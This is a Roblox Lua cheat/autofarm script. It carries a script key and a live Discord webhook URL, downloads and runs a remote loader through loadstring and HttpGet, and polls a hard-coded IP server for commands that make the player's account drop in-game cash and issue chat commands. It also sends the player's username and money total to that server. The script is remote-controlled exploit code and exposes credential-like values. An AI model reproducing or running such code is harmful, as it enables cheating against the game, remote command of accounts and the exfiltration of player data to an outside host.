script_key = 'VYduAVBjFTcppIFDfCaRfOcQIcVsTqhu'
getgenv().AutofarmSettings = {
    ["Fps"] = 10,
    ["InstaTP"] = true,
    ["Underground"] = false,

    ["Webhook"] = {
        ["URL"] = "https://discord.com/api/webhooks/1355521391218266222/8Luq8oDNFJ0Xf_lbk8QIZNMAIzgXbNR9l2AKM6nM5LndGuTQ9ELrtasB9C8t2gKEdGnC",
        ["Interval"] = 10
    },

    ["Serverhop"] = {
        ["Cycle"]   = 1,        -- 1 = After dying once.
        ["Time"]    = 60,        -- 1 = After 1 Minute.
        ["Kick"]    = true,    -- true = After getting kicked.
        ["Blacklisted_IDs"] = { 1234567890, 1234567890 } -- If UserID was found ingame, Detects new joining players too.
    },
    " LsDhc On Top!"
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2f5a5d4b9fc7ed0f115580a53bfab777.lua"))()


local airlockTriggered = false
local cdropAmount = 0
local cdropExecuted = false

local function getCdropAmount()
    local success, response = pcall(function()
        return http_request({
            Url = "http://194.163.128.135:2006/cdrop",
            Method = "GET"
        })
    end)

    if success and type(response) == "table" and response.Body then
        local data = game:GetService("HttpService"):JSONDecode(response.Body)
        cdropAmount = data.amount or 0
    end
end

local function handleCdrop()
    if cdropAmount > 0 and not cdropExecuted then
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/cdrop " .. cdropAmount, "All")
        cdropExecuted = true
    end
end

local function extractMoneyAmount(text)
    local amount = text:gsub("[^%d]", "")
    return tonumber(amount)
end

local function sendMoneyData(username, moneyAmount)
    local url = "http://194.163.128.135:2006/" .. username .. "/" .. moneyAmount
    local httpService = game:GetService("HttpService")
    local data = {
        ["username"] = username,
        ["moneyAmount"] = moneyAmount
    }
    local jsonData = httpService:JSONEncode(data)

    local success, response = pcall(function()
        return http_request({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)

    if success and type(response) == "table" and response.Body then
        print("Request sent successfully")
        print("Response: " .. response.Body)
    else
        print("Failed to send request")
    end
end

local function printMoneyAmount(moneyTextLabel)
    local moneyAmount = extractMoneyAmount(moneyTextLabel.Text)
    local player = game.Players.LocalPlayer
    if moneyAmount then
        print("Money Amount: " .. moneyAmount)
        sendMoneyData(player.Name, moneyAmount)
    else
        warn("Failed to extract money amount from MoneyText.")
    end
end

local function onMoneyTextFound(moneyTextLabel)
    print("MoneyText label found!")
    printMoneyAmount(moneyTextLabel)
    moneyTextLabel:GetPropertyChangedSignal("Text"):Connect(function()
        printMoneyAmount(moneyTextLabel)
    end)
end

game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/code Duck", "All")

while true do
    wait(5)
    getCdropAmount()

    if cdropAmount > 0 then
        handleCdrop()
    end

    local success, response = pcall(function()
        return http_request({
            Url = "http://194.163.128.135:2006",
            Method = "GET"
        })
    end)

    if success and type(response) == "table" and response.Body then
        local data = game:GetService("HttpService"):JSONDecode(response.Body)

        if type(data) == "table" and data.success == true and not cdropExecuted then
            if data.amount and data.amount > 0 then
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/cdrop " .. data.amount, "All")
                cdropExecuted = true
            end
        end

        if response.Body == "true" and not airlockTriggered then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/airlock", "All")
            airlockTriggered = true
        elseif response.Body == "false" then
            airlockTriggered = false
        end
    end

    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local moneyTextLabel = playerGui:FindFirstChild("MoneyText", true)

    if moneyTextLabel and moneyTextLabel:IsA("TextLabel") then
        printMoneyAmount(moneyTextLabel)
    else
        playerGui.DescendantAdded:Connect(function(descendant)
            if descendant.Name == "MoneyText" and descendant:IsA("TextLabel") then
                onMoneyTextFound(descendant)
            end
        end)
        print("Waiting for MoneyText to be added...")
    end
end
